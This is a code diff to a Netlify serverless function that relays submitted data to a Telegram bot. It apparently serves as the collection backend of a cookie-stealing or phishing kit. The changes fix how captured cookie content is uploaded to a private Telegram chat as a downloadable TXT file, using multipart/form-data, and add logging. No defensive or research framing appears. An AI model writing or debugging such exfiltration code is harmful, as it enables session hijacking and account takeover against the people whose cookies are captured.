@@ -1,10 +1,9 @@
 /**
  * PRODUCTION-READY: Telegram Bot Function for Netlify
- * FIXED: Sends cookies as downloadable TXT file (using sendDocument with file upload)
+ * FIXED: Sends cookies as downloadable TXT file using multipart/form-data
  */
 
 const https = require('https');
-const querystring = require('querystring');
 
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
@@ -63,15 +62,21 @@ function sendMessageToTelegram(text, parseMode = 'HTML') {
   });
 }
 
-// ✅ NEW: Send file as document (downloadable)
+// ✅ FIXED: Send file as multipart/form-data (proper file upload)
 function sendDocumentToTelegram(fileContent, fileName) {
   return new Promise((resolve, reject) => {
-    const postData = JSON.stringify({
-      chat_id: TELEGRAM_CHAT_ID,
-      document: `data:text/plain;base64,${Buffer.from(fileContent).toString('base64')}`,
-      caption: `📥 ${fileName}`,
-      parse_mode: 'HTML'
-    });
+    const boundary = '----WebKitFormBoundary' + Math.random().toString(36).substring(2, 15);
+    
+    let body = `--${boundary}\r\n`;
+    body += `Content-Disposition: form-data; name="chat_id"\r\n\r\n`;
+    body += `${TELEGRAM_CHAT_ID}\r\n`;
+    body += `--${boundary}\r\n`;
+    body += `Content-Disposition: form-data; name="document"; filename="${fileName}"\r\n`;
+    body += `Content-Type: text/plain\r\n\r\n`;
+    body += fileContent;
+    body += `\r\n--${boundary}--\r\n`;
+
+    const bodyBuffer = Buffer.from(body, 'utf8');
 
     const options = {
       hostname: 'api.telegram.org',
@@ -79,27 +84,35 @@ function sendDocumentToTelegram(fileContent, fileName) {
       path: `/bot${TELEGRAM_BOT_TOKEN}/sendDocument`,
       method: 'POST',
       headers: {
-        'Content-Type': 'application/json',
-        'Content-Length': Buffer.byteLength(postData)
+        'Content-Type': `multipart/form-data; boundary=${boundary}`,
+        'Content-Length': bodyBuffer.length
       },
       timeout: 15000
     };
 
-    console.log('📤 [TELEGRAM] Sending document as file...');
+    console.log('📤 [TELEGRAM] Sending document via multipart/form-data...');
+    console.log('File name:', fileName);
+    console.log('Content length:', fileContent.length);
 
     const req = https.request(options, (res) => {
       let data = '';
+      console.log('📥 [TELEGRAM] Response status:', res.statusCode);
+      
       res.on('data', (chunk) => { data += chunk; });
       res.on('end', () => {
         try {
           const response = JSON.parse(data);
+          console.log('📥 [TELEGRAM] Response:', JSON.stringify(response));
+          
           if (res.statusCode === 200 && response.ok) {
-            console.log('✅ [TELEGRAM] Document sent as downloadable file');
+            console.log('✅ [TELEGRAM] Document sent successfully as downloadable file');
             resolve(response);
           } else {
+            console.error('❌ [TELEGRAM] API rejected:', response.description);
             reject(new Error(`Telegram API error: ${response.description || 'Unknown error'}`));
           }
         } catch (e) {
+          console.error('❌ [TELEGRAM] Parse error:', e.message, 'Data:', data);
           reject(new Error(`Failed to parse Telegram response: ${e.message}`));
         }
       });
@@ -111,11 +124,12 @@ function sendDocumentToTelegram(fileContent, fileName) {
     });
 
     req.on('timeout', () => {
+      console.error('❌ [TELEGRAM] Document send timeout');
       req.destroy();
       reject(new Error('Telegram request timeout'));
     });
 
-    req.write(postData);
+    req.write(bodyBuffer);
     req.end();
   });
 }
@@ -157,7 +171,6 @@ function formatMainMessage(data) {
 }
 
 function formatCookieMessage(cookieFile) {
-  // ✅ Return ONLY the cookie content as plain text (TXT file)
   return cookieFile.content;
 }
 
@@ -296,7 +309,7 @@ exports.handler = async (event, context) => {
 
         console.log('📤 Sending cookies as downloadable TXT file...');
         
-        // ✅ Send as document (downloadable file)
+        // ✅ Send as document via multipart/form-data
         await sendWithRetry(() => sendDocumentToTelegram(cookieContent, fileName));
 
         cookiesSent = true;
